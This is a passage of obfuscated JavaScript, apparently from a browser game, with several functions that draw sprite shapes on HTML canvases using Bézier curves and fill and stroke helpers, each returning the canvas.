			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ], Ⲇᐃ[ΔⲆⵠⲆ], 12 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -10, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 100.5, 126.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151.5, ᐃ * 104.34375, 279.5 * ᐃ, ᐃ * 188.34375, ᐃ * 297.5, ᐃ * 292.34375);
			Δ.bezierCurveTo(222.5 * ᐃ, 307.34375 * ᐃ, ᐃ * 106.5, ᐃ * 196.34375, 100.5 * ᐃ, 127.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⲆΔΔΔ], ᐃ * ⲆΔⲆΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(106.5 * ᐃ, 131.34375 * ᐃ);
			Δ.bezierCurveTo(140.5 * ᐃ, ᐃ * 142.34375, 225.5 * ᐃ, 184.34375 * ᐃ, ᐃ * 290.5, 287.34375 * ᐃ);
			Δ.bezierCurveTo(270.5 * ᐃ, ᐃ * 188.34375, 152.5 * ᐃ, ᐃ * 118.34375, ᐃ * 107.5, 131.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 157.5, 137.34375 * ᐃ);
			Δ.bezierCurveTo(161.5 * ᐃ, 138.34375 * ᐃ, 164.5 * ᐃ, 140.34375 * ᐃ, ᐃ * 168.5, 142.34375 * ᐃ);
			Δ.bezierCurveTo(165.5 * ᐃ, ᐃ * 156.34375, 141.5 * ᐃ, 176.34375 * ᐃ, 126.5 * ᐃ, 179.34375 * ᐃ);
			Δ.bezierCurveTo(123.5 * ᐃ, ᐃ * 173.34375, 120.5 * ᐃ, 169.34375 * ᐃ, ᐃ * 120.5, ᐃ * 169.34375);
			Δ.bezierCurveTo(ᐃ * 141.5, 161.34375 * ᐃ, 156.5 * ᐃ, 145.34375 * ᐃ, 155.5 * ᐃ, ᐃ * 136.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 125.5 * ᐃ, ᐃ * 140.34375, 11.180339887498949 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⲆᐃ]);
			ⵠᐃᐃ(Δ, ᐃ * 122.5, 135.34375 * ᐃ, ᐃ * 5.0990195135927845);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(196.5 * ᐃ, 151.34375 * ᐃ);
			Δ.bezierCurveTo(211.5 * ᐃ, 158.34375 * ᐃ, ᐃ * 224.5, ᐃ * 171.34375, ᐃ * 229.5, 176.34375 * ᐃ);
			Δ.bezierCurveTo(246.5 * ᐃ, 163.34375 * ᐃ, ᐃ * 259.5, 166.34375 * ᐃ, 272.5 * ᐃ, 168.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 254.5, ᐃ * 146.34375, ᐃ * 214.5, ᐃ * 145.34375, 198.5 * ᐃ, ᐃ * 151.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], ⵠΔᐃΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(154.5 * ᐃ, ᐃ * 222.34375);
			Δ.bezierCurveTo(ᐃ * 164.5, ᐃ * 234.34375, 173.5 * ᐃ, ᐃ * 242.34375, 178.5 * ᐃ, 245.34375 * ᐃ);
			Δ.bezierCurveTo(174.5 * ᐃ, 265.34375 * ᐃ, ᐃ * 180.5, ᐃ * 274.34375, ᐃ * 186.5, ᐃ * 283.34375);
			Δ.bezierCurveTo(ᐃ * 165.5, 277.34375 * ᐃ, 151.5 * ᐃ, ᐃ * 245.34375, ᐃ * 155.5, 224.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃᐃΔ], Ⲇᐃ[8], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(279.5 * ᐃ, ᐃ * 294.34375);
			Δ.bezierCurveTo(ᐃ * 286.5, 285.84375 * ᐃ, 286.5 * ᐃ, 285.84375 * ᐃ, ᐃ * 293.5, ᐃ * 277.34375);
			Δ.bezierCurveTo(315.5 * ᐃ, 280.34375 * ᐃ, ᐃ * 315.5, ᐃ * 280.34375, ᐃ * 337.5, 283.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 340.5, 311.34375 * ᐃ, 317.5 * ᐃ, 326.34375 * ᐃ, ᐃ * 307.5, 331.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], ⲆΔⲆΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(296.5 * ᐃ, 287.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 311.5, ᐃ * 291.34375, 311.5 * ᐃ, 291.34375 * ᐃ, ᐃ * 326.5, ᐃ * 295.34375);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ⵠΔᐃⲆᐃᐃⲆ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(294.5 * ᐃ, ᐃ * 289.34375);
			Δ.bezierCurveTo(308.5 * ᐃ, ᐃ * 297.34375, ᐃ * 308.5, ᐃ * 297.34375, 322.5 * ᐃ, 305.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔΔΔᐃᐃ], ⲆΔᐃⵠⵠᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(294.5 * ᐃ, ᐃ * 291.34375);
			Δ.bezierCurveTo(ᐃ * 304, ᐃ * 303.34375, 304 * ᐃ, 303.34375 * ᐃ, ᐃ * 313.5, ᐃ * 315.34375);
			Δ.closePath();
			ΔⲆ(Δ, ᐃⵠᐃⵠᐃ, Ⲇᐃ[ᐃⵠⲆΔⲆᐃⲆ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 226.5, 161.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 230.5, 160.34375 * ᐃ, ᐃ * 236.5, 158.34375 * ᐃ, ᐃ * 238.5, ᐃ * 161.34375);
			Δ.bezierCurveTo(238.5 * ᐃ, ᐃ * 157.34375, 228.5 * ᐃ, 159.34375 * ᐃ, ᐃ * 227.5, 161.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[9], ᐃ * ᐃⲆᐃⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(167.5 * ᐃ, ᐃ * 248.34375);
			Δ.bezierCurveTo(ᐃ * 165.5, ᐃ * 251.34375, 168.5 * ᐃ, 256.34375 * ᐃ, ᐃ * 168.5, 253.34375 * ᐃ);
			Δ.bezierCurveTo(166.5 * ᐃ, 252.34375 * ᐃ, 168.5 * ᐃ, 246.34375 * ᐃ, ᐃ * 166.5, 247.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[9], ⲆⲆΔⲆ * ᐃ);
			return Ⲇⵠ
		}

		function ΔⵠᐃⲆⵠⲆⲆᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 309 * ᐃ;
			Ⲇⵠ.height = ᐃ * 287;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⵠ;
			Δ.translate(10 * ᐃ, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(34.5 * ᐃ, ᐃ * 38.53125);
			Δ.bezierCurveTo(ᐃ * 91.5, ᐃ * 30.53125, ᐃ * 138.5, 68.53125 * ᐃ, 169.5 * ᐃ, 93.53125 * ᐃ);
			Δ.bezierCurveTo(208.5 * ᐃ, ᐃ * 128.53125, 226.5 * ᐃ, 157.53125 * ᐃ, 233.5 * ᐃ, 209.53125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 195.5, 218.53125 * ᐃ, ᐃ * 138.5, 191.53125 * ᐃ, 105.5 * ᐃ, ᐃ * 157.53125);
			Δ.bezierCurveTo(ᐃ * 54.5, 112.53125 * ᐃ, 41.5 * ᐃ, 80.53125 * ᐃ, ᐃ * 33.5, 38.53125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔᐃΔΔ], ᐃ * ᐃⵠΔⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 143.5, 74.53125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 164.5, 73.53125 * ᐃ, ᐃ * 159, 74.53125 * ᐃ, ᐃ * 174.5, ᐃ * 74.53125);
			Δ.bezierCurveTo(ᐃ * 186, 86.53125 * ᐃ, ᐃ * 186, 86.53125 * ᐃ, 197.5 * ᐃ, 98.53125 * ᐃ);
			Δ.bezierCurveTo(186 * ᐃ, ᐃ * 97.03125, ᐃ * 186, 97.03125 * ᐃ, 174.5 * ᐃ, ᐃ * 95.53125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⲆⵠΔΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 87.5, ᐃ * 142.53125);
			Δ.bezierCurveTo(92 * ᐃ, 160.03125 * ᐃ, ᐃ * 92, 160.03125 * ᐃ, 96.5 * ᐃ, ᐃ * 177.53125);
			Δ.bezierCurveTo(ᐃ * 108, 181.53125 * ᐃ, 108 * ᐃ, 181.53125 * ᐃ, 119.5 * ᐃ, ᐃ * 185.53125);
			Δ.bezierCurveTo(ᐃ * 116.5, 175.53125 * ᐃ, ᐃ * 116.5, 175.53125 * ᐃ, 113.5 * ᐃ, 165.53125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ], Ⲇᐃ[ⵠⲆⲆ], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(236.5 * ᐃ, 189.53125 * ᐃ);
			Δ.bezierCurveTo(274.5 * ᐃ, ᐃ * 197.53125, 255.5 * ᐃ, ᐃ * 194.03125, ᐃ * 274.5, ᐃ * 198.53125);
			Δ.bezierCurveTo(ᐃ * 272.5, ᐃ * 236.53125, 261.5 * ᐃ, ᐃ * 237.53125, ᐃ * 242.5, ᐃ * 248.53125);
			Δ.bezierCurveTo(ᐃ * 230.5, 231.03125 * ᐃ, 230.5 * ᐃ, 231.03125 * ᐃ, ᐃ * 218.5, 213.53125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔΔⵠⵠ], ΔⲆⵠⲆⲆ * ᐃ);
			Δ.globalAlpha = ᐃᐃⲆΔ;
			Δ.translate(-10 * ᐃ, -ᐃΔΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 34.5, ᐃ * 38.53125);
			Δ.bezierCurveTo(91.5 * ᐃ, ᐃ * 30.53125, 138.5 * ᐃ, ᐃ * 68.53125, 169.5 * ᐃ, ᐃ * 93.53125);
			Δ.bezierCurveTo(ᐃ * 208.5, ᐃ * 128.53125, 226.5 * ᐃ, ᐃ * 157.53125, 233.5 * ᐃ, ᐃ * 209.53125);
			Δ.bezierCurveTo(ᐃ * 195.5, 218.53125 * ᐃ, ᐃ * 138.5, 191.53125 * ᐃ, ᐃ * 105.5, ᐃ * 157.53125);
			Δ.bezierCurveTo(ᐃ * 54.5, ᐃ * 112.53125, ᐃ * 41.5, ᐃ * 80.53125, 33.5 * ᐃ, ᐃ * 38.53125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆⲆᐃΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(143.5 * ᐃ, 74.53125 * ᐃ);
			Δ.bezierCurveTo(164.5 * ᐃ, ᐃ * 73.53125, ᐃ * 159, 74.53125 * ᐃ, 174.5 * ᐃ, 74.53125 * ᐃ);
			Δ.bezierCurveTo(186 * ᐃ, ᐃ * 86.53125, ᐃ * 186, 86.53125 * ᐃ, ᐃ * 197.5, ᐃ * 98.53125);
			Δ.bezierCurveTo(ᐃ * 186, ᐃ * 97.03125, ᐃ * 186, 97.03125 * ᐃ, ᐃ * 174.5, ᐃ * 95.53125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 87.5, 142.53125 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, ᐃ * 160.03125, 92 * ᐃ, 160.03125 * ᐃ, ᐃ * 96.5, ᐃ * 177.53125);
			Δ.bezierCurveTo(ᐃ * 108, ᐃ * 181.53125, ᐃ * 108, ᐃ * 181.53125, 119.5 * ᐃ, 185.53125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 116.5, ᐃ * 175.53125, 116.5 * ᐃ, 175.53125 * ᐃ, ᐃ * 113.5, ᐃ * 165.53125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(236.5 * ᐃ, ᐃ * 189.53125);
			Δ.bezierCurveTo(274.5 * ᐃ, 197.53125 * ᐃ, 255.5 * ᐃ, 194.03125 * ᐃ, 274.5 * ᐃ, ᐃ * 198.53125);
			Δ.bezierCurveTo(ᐃ * 272.5, ᐃ * 236.53125, 261.5 * ᐃ, ᐃ * 237.53125, ᐃ * 242.5, 248.53125 * ᐃ);
			Δ.bezierCurveTo(230.5 * ᐃ, 231.03125 * ᐃ, 230.5 * ᐃ, ᐃ * 231.03125, 218.5 * ᐃ, 213.53125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ], Ⲇᐃ[2], ᐃ * ᐃⵠΔⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(109.5 * ᐃ, 51.53125 * ᐃ);
			Δ.bezierCurveTo(107.5 * ᐃ, ᐃ * 92.53125, 91.5 * ᐃ, ᐃ * 95.53125, ᐃ * 59.5, 101.53125 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[2], ᐃ * ⲆᐃᐃᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(72.5 * ᐃ, 51.53125 * ᐃ);
			Δ.bezierCurveTo(71 * ᐃ, 64.53125 * ᐃ, ᐃ * 69.5, ᐃ * 76.53125, ᐃ * 69.5, 77.53125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ], Ⲇᐃ[2], ΔΔᐃⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 84.5, 63.53125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70.5, ᐃ * 65.03125, ᐃ * 70.5, ᐃ * 65.03125, 56.5 * ᐃ, ᐃ * 66.53125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[2], ᐃ * ᐃᐃᐃⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(125.5 * ᐃ, ᐃ * 84.53125);
			Δ.bezierCurveTo(ᐃ * 125.5, 110.03125 * ᐃ, ᐃ * 125.5, 110.03125 * ᐃ, 125.5 * ᐃ, 135.53125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆᐃᐃⲆ], ᐃ * ⵠΔᐃⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 149.5, ᐃ * 108.53125);
			Δ.bezierCurveTo(150 * ᐃ, 137.03125 * ᐃ, ᐃ * 150, 137.03125 * ᐃ, ᐃ * 150.5, ᐃ * 165.53125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠⵠΔ], ᐃ * ⵠⵠⲆⲆⵠ);
			return Ⲇⵠ
		}

		function ⲆⲆⵠⵠΔΔΔΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 400 * ᐃ;
			Ⲇⵠ.height = ᐃ * 400;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(96.5 * ᐃ, 277.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 197.5, 259.84375 * ᐃ, 197.5 * ᐃ, 259.84375 * ᐃ, ᐃ * 298.5, ᐃ * 242.34375);
			Δ.bezierCurveTo(ᐃ * 311.5, 231.34375 * ᐃ, 307.5 * ᐃ, ᐃ * 168.34375, 298.5 * ᐃ, ᐃ * 150.34375);
			Δ.bezierCurveTo(198 * ᐃ, 170.34375 * ᐃ, 198 * ᐃ, 170.34375 * ᐃ, ᐃ * 97.5, 190.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[2], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 98.5, 214.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 199, ᐃ * 196.34375, 199 * ᐃ, 196.34375 * ᐃ, 299.5 * ᐃ, 178.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔⵠᐃΔ, Ⲇᐃ[2], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(98.5 * ᐃ, 247.34375 * ᐃ);
			Δ.bezierCurveTo(201.5 * ᐃ, 229.34375 * ᐃ, ᐃ * 201.5, ᐃ * 229.34375, ᐃ * 304.5, ᐃ * 211.34375);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃⵠⲆⲆⲆ], ᐃ * ⵠⵠᐃΔⵠᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(97.5 * ᐃ, 189.34375 * ᐃ);
			Δ.bezierCurveTo(97 * ᐃ, 199.84375 * ᐃ, ᐃ * 97, ᐃ * 199.84375, ᐃ * 96.5, 210.34375 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, 204.34375 * ᐃ, ᐃ * 110.5, ᐃ * 204.34375, ᐃ * 124.5, ᐃ * 198.34375);
			Δ.bezierCurveTo(ᐃ * 137.5, 203.84375 * ᐃ, ᐃ * 137.5, 203.84375 * ᐃ, 150.5 * ᐃ, ᐃ * 209.34375);
			Δ.bezierCurveTo(172 * ᐃ, ᐃ * 197.84375, ᐃ * 172, ᐃ * 197.84375, 193.5 * ᐃ, ᐃ * 186.34375);
			Δ.bezierCurveTo(211.5 * ᐃ, 189.84375 * ᐃ, 211.5 * ᐃ, ᐃ * 189.84375, ᐃ * 229.5, 193.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 240.5, ᐃ * 193.34375, 240.5 * ᐃ, 193.34375 * ᐃ, ᐃ * 251.5, 193.34375 * ᐃ);
			Δ.bezierCurveTo(261 * ᐃ, 182.84375 * ᐃ, 261 * ᐃ, ᐃ * 182.84375, ᐃ * 270.5, ᐃ * 172.34375);
			Δ.bezierCurveTo(287.5 * ᐃ, 169.34375 * ᐃ, ᐃ * 287.5, ᐃ * 169.34375, ᐃ * 304.5, 166.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 304.5, 156.34375 * ᐃ, ᐃ * 300.5, 145.34375 * ᐃ, 298.5 * ᐃ, 147.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ], Ⲇᐃ[4], ᐃ * ⵠⲆⵠⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(300.5 * ᐃ, 147.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 293.5, 121.34375 * ᐃ, ᐃ * 278.5, ᐃ * 106.34375, ᐃ * 256.5, ᐃ * 101.34375);
			Δ.bezierCurveTo(176.5 * ᐃ, 145.34375 * ᐃ, 176.5 * ᐃ, ᐃ * 145.34375, 96.5 * ᐃ, ᐃ * 189.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔᐃ], Ⲇᐃ[ⲆᐃⲆᐃ], ᐃ * 12);
			ⵠᐃᐃ(Δ, 252.5 * ᐃ, 129.34375 * ᐃ, 18.027756377319946 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[7]);
			ⵠᐃᐃ(Δ, ᐃ * 248.5, 121.34375 * ᐃ, ᐃ * 8.246211251235321);
			ΔⲆ(Δ, Ⲇᐃ[8]);
			return Ⲇⵠ
		}

		function ΔᐃΔᐃΔⲆⲆᐃᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 243 * ᐃ;
			Ⲇⵠ.height = ᐃ * 172;
			ⵠᐃᐃ(Δ, 119.5 * ᐃ, ᐃ * 140.125, 19 * ᐃ);
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ΔⲆⵠ], ΔΔᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 36.5, 20.125 * ᐃ);
			Δ.bezierCurveTo(119.5 * ᐃ, ᐃ * 20.625, 119.5 * ᐃ, ᐃ * 20.625, ᐃ * 202.5, 21.125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 214.5, ᐃ * 22.125, ᐃ * 216.5, 26.125 * ᐃ, 217.5 * ᐃ, 35.125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 221, 76.125 * ᐃ, 221 * ᐃ, 76.125 * ᐃ, 224.5 * ᐃ, 117.125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 225.5, 127.125 * ᐃ, 221.5 * ᐃ, ᐃ * 131.125, ᐃ * 210.5, ᐃ * 132.125);
			Δ.bezierCurveTo(117.5 * ᐃ, ᐃ * 132.125, ᐃ * 117.5, 132.125 * ᐃ, 24.5 * ᐃ, ᐃ * 132.125);
			Δ.bezierCurveTo(ᐃ * 14.5, ᐃ * 131.125, 13.5 * ᐃ, 126.125 * ᐃ, 16.5 * ᐃ, ᐃ * 111.125);
			Δ.bezierCurveTo(ᐃ * 19.5, 73.125 * ᐃ, ᐃ * 19.5, 73.125 * ᐃ, ᐃ * 22.5, ᐃ * 35.125);
			Δ.bezierCurveTo(ᐃ * 23.5, ᐃ * 23.125, 29.5 * ᐃ, 21.125 * ᐃ, 36.5 * ᐃ, 20.125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ], Ⲇᐃ[ⵠⲆΔ], ⵠⲆⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(15.5 * ᐃ, 138.625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 120, ᐃ * 138.625, ᐃ * 120, 138.625 * ᐃ, 224.5 * ᐃ, 138.625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠⵠΔ, Ⲇᐃ[2], ᐃ * ⲆⲆᐃΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(13.5 * ᐃ, 131.625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119.5, 131.625 * ᐃ, ᐃ * 119.5, 131.625 * ᐃ, ᐃ * 225.5, ᐃ * 131.625);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], 10 * ᐃ);
			ⵠᐃᐃ(Δ, 119.5 * ᐃ, 140.125 * ᐃ, 14.866068747318506 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃΔ], Ⲇᐃ[5], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 106.5, 146.625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 116.5, 137.625 * ᐃ, ᐃ * 118.5, 136.625 * ᐃ, 123.5 * ᐃ, 138.625 * ᐃ);
			Δ.bezierCurveTo(131.5 * ᐃ, ᐃ * 145.625, 133.5 * ᐃ, 148.625 * ᐃ, 127.5 * ᐃ, ᐃ * 152.625);
			Δ.bezierCurveTo(ᐃ * 115.5, ᐃ * 158.625, ᐃ * 111.5, 153.625 * ᐃ, ᐃ * 106.5, ᐃ * 147.625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], ΔⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105.5, 146.625 * ᐃ);
			Δ.bezierCurveTo(116.5 * ᐃ, ᐃ * 159.625, ᐃ * 124.5, 156.625 * ᐃ, 132.5 * ᐃ, ᐃ * 146.625);
			ΔⲆ(Δ, undefined, Ⲇᐃ[8], ᐃⲆⵠΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 75.5, ᐃ * 80.125);
			Ⲇᐃᐃ(Δ, ᐃ * -39, ᐃ * -40, ᐃ * 78, 78 * ᐃ, ᐃ * ⵠⵠΔⲆᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠⵠ]);
			Δ.save();
			Δ.translate(ᐃ * 167, 80.125 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -38.5, ᐃ * -39, 78 * ᐃ, ᐃ * 78, ᐃ * ⲆⵠⲆⵠⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[9]);
			return Ⲇⵠ
		}

		function ΔⵠⵠⲆᐃᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 373;
			Ⲇⵠ.height = ᐃ * 314;
